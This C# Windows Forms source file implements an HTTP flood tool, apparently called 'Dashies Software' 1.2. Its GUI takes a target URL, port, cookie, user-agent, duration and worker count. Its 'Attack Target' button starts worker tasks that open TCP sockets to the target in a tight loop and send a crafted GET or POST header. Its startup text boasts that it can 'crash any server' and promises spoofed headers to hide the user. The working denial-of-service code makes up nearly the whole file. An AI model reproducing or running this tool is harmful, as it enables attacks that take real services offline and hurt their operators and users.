using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using System.Resources;
using System.Reflection;
using System.Runtime.InteropServices;

namespace src
{
    public partial class Main : Form
    {
        Tools tool = new Tools();
        Dash_Library Get = new Dash_Library();
        Control_Lib Misc = new Control_Lib();


        private struct Debug
        {
            public bool status;
            public int startuplog;
        };


        private static String Send = String.Empty;
        
        private static Boolean timeout = false, IsRunning = false;//, Booted = false;
        private static int selected = 1, Red = 32, Green = 32, Blue = 32;

        private Debug debug;

        private PictureBox department = new PictureBox();
        private Panel Layer = new Panel();

        private static Label title = new Label(), url = new Label(), port = new Label(), duration = new Label(), cookie = new Label(), workers = new Label(), post = new Label(), get = new Label(), useragent = new Label();
        private static Button quit = new Button(), minimize = new Button(), methodPOST = new Button(), methodGET = new Button(), Ping = new Button(), Attack = new Button(), StopAttack = new Button();
        private static TextBox Url = new TextBox(), Duration = new TextBox(), Port = new TextBox(), Cookie = new TextBox(), Workers = new TextBox(), Status = new TextBox(), UserAgent = new TextBox();

        public void boot() {
            this.Hide();

            /* Hello Future, add a splash screen here. */

            this.Show();
        }

        ToolTip tooltip = new ToolTip
        {
            UseAnimation = true,
            UseFading = true,
            ToolTipTitle = "Invalid Input"
        };

        public Main()
        {
            InitializeComponent();
            ResourceManager REGEX = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());


            this.Icon = (Icon)REGEX.GetObject("icon"); // Application Icon Here
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = Color.FromArgb(Red, Green, Blue);
            this.Text = "I ❤ D✿SH";


            tool.SetFormCursor(this, (Byte[])REGEX.GetObject("main"));

            Get.InjectInputBox(this, "", Status, 390, 150, 375, 276, 8, 48, 48, 48, 180, 180, 180);

            Status.VisibleChanged += (sender, argumentation) => {
                if (Status.Visible)
                {
                    Status.SelectionStart = Status.Text.Length;
                    Status.ScrollToCaret();
                }
            };

            Status.ScrollBars = ScrollBars.Vertical;
            Status.Multiline = true;
            Status.HideSelection = true;
            Status.AcceptsTab = true;
            Status.WordWrap = true;
            Status.ReadOnly = true;

            if (debug.startuplog == 0)
            {
                debug.startuplog = 1;
                Status.Text = gimmealltext();
            }

            department.MouseMove += (sentBy, msBeautiful) => { Misc.MiceMove(this, msBeautiful); };
            department.MouseDown += (sentBy, msBeautiful) => { Misc.MiceDown(msBeautiful); };

            debug.status = Get.InjectText(this, title, 0, 2, 285, 22, "(c) All Rights Reserved, Dashies Software Inc.", 8, 102, 35, 178, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.InjectButton(this, quit, "X", this.Width - 74, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.InjectButton(this, minimize, "-", this.Width - 148, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.CreateMenu(this, 0, 0, this.Width, 24, department, ("profile"), 28, 24, 1, 102, 35, 178);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            Get.InjectInputBox(this, "http://www.google.co.uk", Url, 50, 65, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, url, (Url.Left + Url.Width) + 15, Url.Top, 75, 25, "URL", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "Cookie=8f75a1acb808d4f709bc4d71b9ab0343", Cookie, 50, 92, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, cookie, (Url.Left + Url.Width) + 15, Cookie.Top, 125, 25, "Cookie(s)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36", UserAgent, 50, 120, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, useragent, (UserAgent.Left + UserAgent.Width) + 15, UserAgent.Top, 125, 25, "User-Agent", 10, 28, 28, 28, 255, 255, 255);

            // Add HTTPS Support
            // Add Socket, UDP and TCP, HTTP Header Methods.

            Get.InjectInputBox(this, "80", Port, 50, 160, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, port, (Port.Left + Port.Width) + 15, Port.Top, 75, 25, "Port", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "265", Duration, 50, 182, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, duration, (Duration.Left + Duration.Width) + 15, Duration.Top, 75, 25, "Seconds (seconds)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "5", Workers, 50, 204, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, workers, (Workers.Left + Workers.Width) + 15, Workers.Top, 75, 25, "Workers (processes)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, methodPOST, "✔", 50, 251, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, post, (methodPOST.Left + methodPOST.Width) + 15, methodPOST.Top, 200, 18, "Use HTTP Method POST", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, methodGET, " ", 50, 275, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, get, (methodPOST.Left + methodPOST.Width) + 15, methodGET.Top, 200, 18, "Use HTTP Method GET", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, Ping, "Ping Target", 50, 315, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, Attack, "Attack Target", 185, 315, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, StopAttack, "Stop Attack", 50, 349, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);

            Get.InjectPanel(this, Layer, 35, 47, this.Width - 70, this.Height - 70, 28, 28, 28);

            selected = 1;

            methodPOST.Click += (sentBy, beautifulPony) => {
                if (selected != 1)
                {
                    methodGET.Text = " ";
                    methodPOST.Text = "✔";
                    selected = 1;
                }
            };

            methodGET.Click += (sentBy, beautifulPony) => {
                if (selected != 2)
                {
                    methodGET.Text = "✔";
                    methodPOST.Text = " ";
                    selected = 2;
                }
            };

            Ping.Click += (sentby, msbeautiful) => {
                if (FormatUrl(Url.Text) == true)
                {
                    Pawng ping = new Pawng(Url.Text);
                    ping.ShowDialog();
                    Url.Text = "http://www.google.com";
                }
            };

            StopAttack.Click += (sentby, thicc) => {
                if (IsRunning == false)
                {
                    Status.AppendText("* the server is not even running, ahaha :o\r\n");
                }
                else
                {
                    IsRunning = false;
                    timeout = true;
                    Status.AppendText("* received your stop signal, this may take 5 seconds!\r\n");

                }
            };

            Attack.Click += (sentby, msbeautiful) => {
                if (IsRunning == true)
                {
                    Status.AppendText("* Ugh, you are already over running the server my lady.\r\n");
                }
                else
                {
                    if (FormatUrl(Url.Text) == true)
                    {
                        String Method = String.Empty;

                        if (selected == 1) Method = "POST";
                        else Method = "GET";

                        Send = $"{Method} / HTTP/1.1\r\n" +
                               $"Host: {Url.Text.Replace("http://", "")}\r\n" +
                               "Connection: keep-alive\r\n" +
                               "Upgrade-Insecure-Requests: 1\r\n" +
                               $"User-Agent: {UserAgent.Text}\r\n" + //Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\r\n" +
                               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
                               "accept-encoding: gzip,deflate\r\n" +
                               "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n" +
                               $"Cookie: {Cookie.Text}; CAKEPHP=uglkh2asdasdassaadgksdjklgjklsdjklsdfhkljsfhjklfhsjklsfhjkljklsfhjklsfhjklfshjklfshjklsfhjklsfjklsfjklsfhkljhvkkslb4qevumf0pr4e4; _pk_id.2.9278=482ceb68ec2fb4f4.1481370495.1.1481371739.1481370495.; _pk_ses.2.9278=*\r\n\r\n";

                        Status.AppendText("========================================================\r\n\r\n");
                        Status.AppendText("* the following header will be used, please make sure it correct as any mistakes can harm the applications performance horribly.\r\n\r\n");
                        Status.AppendText(Send);
                        Status.AppendText("========================================================\r\n\r\n");

                        IsRunning = true;
                        timeout = false;

                        Status.AppendText("* initializing Attack ....\r\n");

                        for (int index = 0; index <= Convert.ToInt32(Workers.Text)-1; index += 1)
                        {
                            Task run = Task.Run((Action)fire);

                            if(index == Convert.ToInt32(Workers.Text)-1) {
                                Task duration = Task.Run((Action)timer);
                            }
                        }
                    }
                }
            };

            Duration.TextChanged += (sent, mystical) => {
                try
                {
                    if ((Duration.Text.All(char.IsDigit) != true) && (Workers.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Duration, 0, -0, 1000);
                    }
                }
                catch { }
            };

            Port.TextChanged += (sent, mystical) => {
                try
                {
                    if ((Port.Text.All(char.IsDigit) != true) && (Port.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Port, 0, -0, 1000);
                    } else
                    {
                        if ((Convert.ToInt32(Port.Text) > 8080) || (Convert.ToInt32(Port.Text) <= 0))
                        {
                            tooltip.Show("choose a port between 1-8080", Port, 0, -0, 1000);
                        }    
                    }
                }
                catch { }
            };

            Workers.TextChanged += (sent, mystical) => {
                try
                {
                    if ((Workers.Text.All(char.IsDigit) != true) && (Workers.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Workers, 0, -0, 1000);
                    }
                    else if (Convert.ToInt32(Workers.Text) >= 150) MessageBox.Show("You do know that this amount of processes can either crash your network or your device? just saying x)", "Lol");
                }
                catch { }
            };

            quit.Click += (sentBy, msValentine) => { this.Close(); };
            minimize.Click += (sentBy, msValentine) => { this.SendToBack(); };

            //Booted = true;
            return;
        }




        private static void timer()
        {
            Status.AppendText("* attack has started successfully!\r\n");

            System.Threading.Thread.Sleep(Convert.ToInt32(Duration.Text) * 1000);

            IsRunning = false;
            timeout = true;

            Status.AppendText("* attack has stopped successfully!\r\n");
        }




        private static void fire()
        {
            IPHostEntry entry;
            List<Socket> SocketWorkers = new List<Socket>();
            Socket longhighs = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            String Target = String.Empty;
            Uri grabIp = new Uri(Url.Text);

            var ipResult = Dns.GetHostAddresses(grabIp.Host)[0];
            try
            {
                while (timeout == false)
                {

                    entry = Dns.GetHostEntry(ipResult);
                    SocketWorkers.Add(longhighs);
                    longhighs = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                    longhighs.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                    longhighs.Send(Encoding.ASCII.GetBytes(Send));
                    longhighs.Close();
                }
            }
            catch { fire(); }
            finally
            {
                foreach (Socket ID in SocketWorkers)
                {
                    ID.Dispose();
                }
            }
        }

        private Boolean FormatUrl(String uri)
        {
            ToolTip tooltip = new ToolTip
            {
                UseAnimation = true,
                UseFading = true,
                ToolTipTitle = "Invalid Input"
            };

            if ((uri.Contains("http://") != true) && (uri.Contains("https://") != true)) { tooltip.Show("only accepts HTTP Urls!", Url, 0, -0, 1000); return false; }

            try { Uri arwl = new Uri(uri); Dns.GetHostAddresses(arwl.Host); }
            catch { tooltip.Show("host seems offline!", Url, 0, -0, 1000); return false; }

            return true;
        }

        private String gimmealltext()
        {
            return
                (
                "Dashies Software 2018 © All Rights Reserved.\r\n\r\n" +

                "~===================================================~" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| oh wow, you actually managed to download 1.2, oof |" + "\r\n" +
                "| this is supposed to be an improvement update, one |" + "\r\n" +
                "| of those updates that come with a lot of bug      |" + "\r\n" +
                "| fixes, so here it is, officialy, 1.2 STABLE.      |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| as you can see, it runs smoother, the file size   |" + "\r\n" +
                "| has been improved, the codes have been optimized  |" + "\r\n" +
                "| and the functionality has been updated, ah and    |" + "\r\n" +
                "| before I forget to say this, I actually added     |" + "\r\n" +
                "| support for HTTPS Servers. just enter the HTTPS   |" + "\r\n" +
                "| url in the target selection bar and change the    |" + "\r\n" +
                "| port to 443.                                      |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| besides all of this, I decided to add a control   |" + "\r\n" +
                "| which allows you to specify the port for the      |" + "\r\n" +
                "| header requests.                                  |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| we recommend using port 443 for HTTPS and using   |" + "\r\n" +
                "| the port 80 for HTTP.                             |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| and also, just know that if the host does not go  |" + "\r\n" +
                "| offline then that is either because the host has  |" + "\r\n" +
                "| more bandwidth than the attacker or because the   |" + "\r\n" +
                "| headers are being blocked.                        |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| spoofed http headers will be here in 1.3 so hide  |" + "\r\n" +
                "| your ass, this app has the ability to crash any   |" + "\r\n" +
                "| server as long you have enough networks using     |" + "\r\n" +
                "| this dash powered application.                    |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "~===================================================~" + "\r\n\r\n\r\n"
                );
        }
    }




    public partial class Notification_UI : Form
    {
        public Notification_UI()
        {
            // for the next update c:
        }
    }




    public partial class Tools
    {
        [DllImport("user32.dll")]
        static extern IntPtr CreateIconFromResource(byte[] presbits, uint dwResSize, bool fIcon, uint dwVer);

        public void SetFormCursor(Form Inject, byte[] Target)
        {
            IntPtr GET = CreateIconFromResource(Target, (uint)Target.Length, false, 0x00030000);
            Cursor SET = new Cursor(GET);
            Inject.Cursor = SET;
            return;
        }
    }




    public class Pawng : Form
    {
        private Tools tool = new Tools();
        private Dash_Library get = new Dash_Library();
        private Button quit = new Button();
        public static TextBox Status = new TextBox();
        public static String target = String.Empty, url = String.Empty;
        public static Boolean IsPinging = false;

        public Pawng(String Target)
        {
            ResourceManager REGEX = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());

            this.StartPosition = FormStartPosition.CenterParent;
            this.FormBorderStyle = FormBorderStyle.None;

            tool.SetFormCursor(this, (Byte[])REGEX.GetObject("main"));

            this.BackColor = Color.FromArgb(16, 16, 16);
            this.ForeColor = Color.FromArgb(255, 255, 255);

            this.Size = new Size(500, 300);
            this.Font = new Font("Consolas", 10);

            get.InjectInputBox(this, "", Status, 0, 21, this.Width, this.Height - 21, 9, 22, 22, 22, 200, 200, 200);

            Status.VisibleChanged += (sender, argumentation) => {
                if (Status.Visible)
                {
                    Status.SelectionStart = Status.Text.Length;
                    Status.ScrollToCaret();
                }
            };

            Status.ScrollBars = ScrollBars.Vertical;
            Status.Multiline = true;
            Status.HideSelection = true;
            Status.AcceptsTab = true;
            Status.WordWrap = true;
            Status.ReadOnly = true;

            get.InjectButton(this, quit, "X", this.Width - 74, -3, 74, 24, 12, 16, 16, 16, 255, 255, 255, 24, 24, 24, 255, 255, 255);

            Uri uri = new Uri(Target);
            var Ip = Dns.GetHostAddresses(uri.Host)[0];
            url = Target;
            target = Ip.ToString();

            Status.AppendText($"* we are going to ping {Target} / {target}!\r\n");
            Status.AppendText("* with 74 bytes, 8 cycles all over ICMPv4.\r\n\r\n");

            var Tokend = new CancellationTokenSource();
            CancellationToken Ct = Tokend.Token;

            IsPinging = true;
            Task Pinger = Task.Run((Action)RunMeh, Tokend.Token);

            quit.Click += (sender, argumentation) => {
                IsPinging = false;
                Tokend.Cancel();
                this.Close();
            };
        }

        static void RunMeh()
        {
            while (IsPinging == true)
            {
                for (int index = 0; index <= 7; index += 1)
                {
                    Ping pingah = new Ping();
                    PingReply reply = pingah.Send(target, 1000);

                    if (reply.Status != IPStatus.Success) Status.AppendText($"[{index}] no reply has been received from {url}!\r\n");
                    else { Status.AppendText($"[{index}] we have received a reply from {url} in {reply.RoundtripTime}ms!\r\n"); System.Threading.Thread.Sleep(500); }

                    pingah.Dispose();
                    IsPinging = false;
                }

                Status.AppendText("\r\n* the results are shown above!\r\n");
                Status.AppendText("* we have successfully pinged the target.");
            }
        }
    }
}
